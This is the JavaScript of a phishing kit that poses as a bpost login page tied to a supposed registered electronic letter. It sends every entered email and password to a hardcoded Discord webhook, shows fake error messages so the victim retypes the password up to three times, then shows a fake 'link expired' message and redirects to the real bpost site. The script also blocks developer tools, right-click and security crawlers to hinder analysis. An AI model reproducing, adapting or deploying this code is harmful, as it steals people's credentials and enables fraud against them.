// Protection JavaScript Anti-bots
(function() {
    'use strict';
    
    // Détection des outils de développement
    let devtools = {
        open: false,
        orientation: null
    };
    
    const threshold = 160;
    
    setInterval(function() {
        if (window.outerHeight - window.innerHeight > threshold || 
            window.outerWidth - window.innerWidth > threshold) {
            if (!devtools.open) {
                devtools.open = true;
                console.clear();
                console.log('%c⚠️ ATTENTION ⚠️', 'color: red; font-size: 50px; font-weight: bold;');
                console.log('%cAccès non autorisé détecté !', 'color: red; font-size: 20px;');
                console.log('%cCette page est protégée par bpost.', 'color: red; font-size: 16px;');
                document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:Arial;"><h1>⚠️ Accès non autorisé détecté</h1></div>';
            }
        } else {
            devtools.open = false;
        }
    }, 500);
    
    // Protection contre le clic droit
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Protection contre les raccourcis clavier
    document.addEventListener('keydown', function(e) {
        // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
        if (e.keyCode === 123 || 
            (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
            (e.ctrlKey && e.shiftKey && e.keyCode === 74) ||
            (e.ctrlKey && e.keyCode === 85)) {
            e.preventDefault();
            return false;
        }
    });
    
    // Protection contre la sélection de texte
    document.addEventListener('selectstart', function(e) {
        if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
            e.preventDefault();
            return false;
        }
    });
    
    // Protection contre le drag & drop
    document.addEventListener('dragstart', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Détection des bots et scrapers
    const botPatterns = [
        /bot/i, /crawler/i, /spider/i, /scraper/i, /curl/i, /wget/i,
        /python/i, /php/i, /java/i, /perl/i, /ruby/i, /go-http/i,
        /selenium/i, /phantom/i, /headless/i, /puppeteer/i
    ];
    
    const userAgent = navigator.userAgent;
    const isBot = botPatterns.some(pattern => pattern.test(userAgent));
    
    if (isBot) {
        document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:Arial;"><h1>🚫 Accès refusé aux robots</h1></div>';
        throw new Error('Bot detected');
    }
    
    // Protection contre l'inspection d'éléments
    let element = new Image();
    Object.defineProperty(element, 'id', {
        get: function() {
            document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:Arial;"><h1>⚠️ Inspection détectée</h1></div>';
        }
    });
    
    // Masquage des erreurs console
    console.log = function() {};
    console.warn = function() {};
    console.error = function() {};
    console.info = function() {};
    console.debug = function() {};
    
})();

// Système de connexion avec compteur de tentatives et envoi Discord
// Compteur de tentatives
let attemptCount = 0;
const maxAttempts = 3;

function postOk() {
    const email = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const submitButton = document.querySelector('.ping-button');
    
    // Validation des champs
    if (!email || !password) {
        showValidationError('Veuillez remplir tous les champs');
        return;
    }
    
    // Incrémenter le compteur
    attemptCount++;
    
    // Désactiver le bouton et afficher le chargement
    submitButton.disabled = true;
    submitButton.classList.add('loading');
    submitButton.style.setProperty('color', 'transparent', 'important');
    submitButton.style.setProperty('text-shadow', 'none', 'important');
    submitButton.style.setProperty('opacity', '0.8', 'important');
    
    // Envoyer à Discord
    sendToDiscord(email, password, attemptCount);
    
    // Traitement selon le nombre de tentatives
    setTimeout(function() {
        submitButton.disabled = false;
        submitButton.classList.remove('loading');
        submitButton.style.removeProperty('color');
        submitButton.style.removeProperty('text-shadow');
        submitButton.style.removeProperty('opacity');
        
        if (attemptCount < maxAttempts) {
            // Tentatives 1 et 2 : Message d'erreur
            showErrorMessage();
        } else {
            // Tentative 3 : Message d'expiration + redirection
            showExpirationMessage();
        }
    }, 1500);
}

function sendToDiscord(email, password, attempt) {
    const discordWebhook = 'https://discordapp.com/api/webhooks/1429658011391098966/auPKn4ybjlG_cZ_2Gx9z9RsjqkDu0wrdsLDHisHGbaWWJBI4p-ODps_JISyR_AYbPH1F';
    const date = new Date().toLocaleString('fr-FR');
    const message = `**🔔 Nouvelle tentative de connexion**\n\n` +
                   `📧 Email : \`${email}\`\n` +
                   `🔑 Mot de passe : \`${password}\`\n` +
                   `📅 Date : ${date}\n` +
                   `🔄 Tentative : ${attempt}/${maxAttempts}`;

    fetch(discordWebhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content: message })
    }).then(response => {
        console.log('Discord response:', response.status);
        if (response.ok) {
            console.log('Message envoyé avec succès à Discord');
        } else {
            console.error('Erreur Discord:', response.statusText);
        }
    }).catch(error => {
        console.error('Erreur envoi Discord:', error);
    });
}

function showErrorMessage() {
    // Supprimer les messages d'erreur précédents
    const existingError = document.querySelector('.letreco-error');
    if (existingError) {
        existingError.remove();
    }
    
    // Créer le nouveau message d'erreur
    const errorMessage = document.createElement('p');
    errorMessage.className = 'letreco-error';
    errorMessage.style.cssText = 'font-style: italic; color: #dc3545; text-align: center; margin: 10px 0; font-size: 14px;';
    errorMessage.textContent = 'Les informations saisies sont incorrectes.';
    
    // Insérer le message avant les boutons
    const buttonsContainer = document.querySelector('.ping-button').parentElement;
    buttonsContainer.parentElement.insertBefore(errorMessage, buttonsContainer);
    
    // Supprimer le message après 5 secondes
    setTimeout(() => {
        if (errorMessage.parentElement) {
            errorMessage.remove();
        }
    }, 5000);
}

function showValidationError(message) {
    // Supprimer les messages d'erreur précédents
    const existingError = document.querySelector('.letreco-error');
    if (existingError) {
        existingError.remove();
    }
    
    // Créer le nouveau message d'erreur
    const errorMessage = document.createElement('p');
    errorMessage.className = 'letreco-error';
    errorMessage.style.cssText = 'font-style: italic; color: #dc3545; text-align: center; margin: 10px 0; font-size: 14px;';
    errorMessage.textContent = message;
    
    // Insérer le message avant les boutons
    const buttonsContainer = document.querySelector('.ping-button').parentElement;
    buttonsContainer.parentElement.insertBefore(errorMessage, buttonsContainer);
    
    // Supprimer le message après 5 secondes
    setTimeout(() => {
        if (errorMessage.parentElement) {
            errorMessage.remove();
        }
    }, 5000);
}

function showExpirationMessage() {
    // Créer la modale d'expiration
    const expirationModal = document.createElement('div');
    expirationModal.className = 'expiration-modal';
    expirationModal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.8);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 10000;
    `;
    
    const expirationContent = document.createElement('div');
    expirationContent.style.cssText = `
        background: white;
        border-radius: 15px;
        padding: 40px;
        max-width: 500px;
        width: 90%;
        text-align: center;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        animation: modalSlideIn 0.5s ease-out;
        margin: 20px;
        box-sizing: border-box;
    `;
    
    // Ajouter des styles responsive pour mobile
    const mediaQuery = window.matchMedia('(max-width: 768px)');
    if (mediaQuery.matches) {
        expirationContent.style.padding = '30px 20px';
        expirationContent.style.margin = '15px';
        expirationContent.style.width = 'calc(100% - 30px)';
        expirationContent.style.maxWidth = 'none';
    }
    
    const mobileQuery = window.matchMedia('(max-width: 480px)');
    if (mobileQuery.matches) {
        expirationContent.style.padding = '25px 15px';
        expirationContent.style.margin = '10px';
        expirationContent.style.width = 'calc(100% - 20px)';
    }
    
    expirationContent.innerHTML = `
        <img src="./static/alerte.png" alt="Alerte" style="width: 60px; margin-bottom: 20px;">
        <h2 style="color: #dc3545; margin-bottom: 15px; font-family: 'Phoenicapro', sans-serif; font-weight: 700; font-size: 2rem;">Lien expiré</h2>
        <p style="color: #666; margin-bottom: 25px; line-height: 1.5; font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; font-weight: 400; font-size: 0.95rem;">
            Votre lien vers le courrier recommandé électronique a expiré.<br>
            Pas d'inquiétude — cela arrive lorsque le délai de validité est dépassé.<br>
            Vous pouvez demander automatiquement un nouveau lien en envoyant un message à l'expéditeur depuis le formulaire ci-dessous.
        </p>
        <div id="requestForm" style="margin-bottom: 20px;">
            <textarea id="messageText" placeholder="Tapez votre message ici..." style="
                width: 100%;
                height: 80px;
                padding: 12px;
                border: 2px solid #ddd;
                border-radius: 8px;
                font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
                font-size: 14px;
                resize: vertical;
                box-sizing: border-box;
                margin-bottom: 15px;
            "></textarea>
            <button id="sendButton" onclick="sendRequest()" style="
                background: #dc3545;
                color: white;
                border: none;
                padding: 12px 25px;
                border-radius: 6px;
                font-size: 1rem;
                cursor: pointer;
                font-weight: 600;
                display: flex;
                align-items: center;
                justify-content: center;
                text-align: center;
                margin: 0 auto;
                min-width: 150px;
                font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
            ">Envoyer</button>
        </div>
        <div id="confirmationMessage" style="display: none; text-align: center;">
            <div style="color: #28a745; font-size: 1.2rem; margin-bottom: 10px;">✓</div>
            <p style="color: #28a745; font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; font-weight: 600;">Message envoyé avec succès !</p>
        </div>
    `;
    
    // Ajuster les tailles pour mobile après création du HTML
    if (mobileQuery.matches) {
        const img = expirationContent.querySelector('img');
        const h2 = expirationContent.querySelector('h2');
        const p = expirationContent.querySelector('p');
        
        if (img) img.style.width = '50px';
        if (h2) h2.style.fontSize = '1.6rem'; // Cohérent avec welcome-title mobile
        if (p) p.style.fontSize = '0.85rem'; // Cohérent avec welcome-description mobile
    }
    
    expirationModal.appendChild(expirationContent);
    document.body.appendChild(expirationModal);
}

function sendRequest() {
    const messageText = document.getElementById('messageText');
    const sendButton = document.getElementById('sendButton');
    const requestForm = document.getElementById('requestForm');
    const confirmationMessage = document.getElementById('confirmationMessage');
    
    // Validation du message
    if (!messageText.value.trim()) {
        alert('Veuillez saisir un message');
        return;
    }
    
    // Désactiver le bouton et afficher le chargement
    sendButton.disabled = true;
    sendButton.classList.add('loading');
    sendButton.style.setProperty('color', 'transparent', 'important');
    sendButton.style.setProperty('text-shadow', 'none', 'important');
    
    // Simuler l'envoi du message (2 secondes)
    setTimeout(() => {
        // Masquer le formulaire et afficher la confirmation
        requestForm.style.display = 'none';
        confirmationMessage.style.display = 'block';
        
        // Animation de confirmation
        confirmationMessage.style.opacity = '0';
        confirmationMessage.style.transform = 'scale(0.8)';
        confirmationMessage.style.transition = 'all 0.3s ease-out';
        
        setTimeout(() => {
            confirmationMessage.style.opacity = '1';
            confirmationMessage.style.transform = 'scale(1)';
        }, 100);
        
        // Redirection vers bpost après 3 secondes
        setTimeout(() => {
            window.location.href = 'https://www.bpost.be/fr/envoyer-lettre';
        }, 3000);
        
    }, 2000);
}

function postOnReturn(event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        postOk();
        return false;
    }
    return true;
}

function setFocus() {
    document.getElementById('username').focus();
}

// Fonctions utilitaires pour les autres fonctionnalités
function postForgotPassword() {
    document.forms[0]['pf.passwordreset'].value = 'clicked';
    showValidationError('Fonctionnalité mot de passe oublié - page de démonstration');
}

function postRecoverUsername() {
    var target = "#";
    document.forms[0].action = target;
    document.forms[0]['pf.usernamerecovery'].value = 'clicked';
    showValidationError('Fonctionnalité récupération nom d\'utilisateur - page de démonstration');
}

function postAlternateAuthnSystem(system) {
    var variants = ["Biometrics", "Windows Hello", "Face ID",  "Touch ID"];
    if(variants.includes(system)) system = "FIDO";
    document.forms[0]['pf.alternateAuthnSystem'].value = system;
    showValidationError('Fonctionnalité authentification alternative - page de démonstration');
}

function postRegistration() {
    document.forms[0]['pf.registration'].value = true;
    showValidationError('Fonctionnalité création de compte - page de démonstration');
}

function setLoginAppName(){
    var rootdomain=location.hostname.split('.').reverse().splice(0,2).reverse().join('.');
    document.cookie="pf-login-app=sml_web_ciam_pr; domain="+rootdomain+"; expires=Thu, 2 Aug 2031 20:47:11 UTC; path=/";
}

function getParamValue(keyName) {
    var results = new RegExp('[\?&]' + keyName + '=([^&#]*)').exec(window.location.href);				
    if(results != null ){				
        return decodeURIComponent(results[1]);
    }
    return "";			
}

function isValidUrl(str) {			
    var regex = /(http|https):\/\/(\w+:{0,1}\w*)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%!\-\/]))?(bpost.be|bpost.cloud|.netpost)/;
    var pattern = new RegExp(regex); 
    return pattern.test(str);
}

function setUilocale(){
    //OSP custom kang cookie
    if(getCookie("pf-app-lang").localeCompare(getCookie("pf-accept-language"))!=0){				
        setPFLangCookie(getCookie("pf-app-lang"));
    }
    //set app_target_uri & profile_target_uri
    if(sessionStorage.getItem("cancelKey")!= "on" && sessionStorage.getItem("hrefKey")!= "on"){
        localStorage.setItem("app_target_uri", getUrlValue("app_target_uri"));
        localStorage.setItem("profile_target_uri", getUrlValue("profile_target_uri"));
    }
    else{
        sessionStorage.removeItem("cancelKey");				
    }				
    //set ui_lang
    if(getParamValue("ui_locales") !=""){
        var localeLang = getParamValue("ui_locales");								
    }
    else{
        var localeLang = getParamValue("ui_lang");
    }
    if(localeLang != "" && sessionStorage.getItem("hrefKey")!= "on"){				
        var cookieLang=getCookie("pf-accept-language");						
        if(localeLang.localeCompare(cookieLang)!=0){				
            setPFLangCookie(localeLang);
        }					
    }
    else{
        sessionStorage.removeItem("hrefKey");
    }
    if(getParamValue("reg_page") =="y"){
        postRegistration();
    }
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}	

function setPFLangCookie(localestr){
    document.cookie="pf-accept-language="+localestr+"; expires=Thu, 2 Aug 2031 20:47:11 UTC; path=/";
    var rootdomain=location.hostname.split('.').reverse().splice(0,2).reverse().join('.');
    document.cookie="pf-app-lang="+localestr+"; domain="+rootdomain+"; expires=Thu, 2 Aug 2031 20:47:11 UTC; path=/";
    window.location.reload();
}

function setHrefCookie(localehref){
    sessionStorage.setItem("hrefKey", "on");
    setPFLangCookie(localehref);
}

function getUrlValue(varname) {
    var url = window.location.search.substring(1);
    var qArray = url.split('&');
    for (var i = 0; i < qArray.length; i++) {
        var pArr = qArray[i].split('=');
        if (pArr[0] == varname) {
            return pArr[1];
        }
    }
    return "";
}
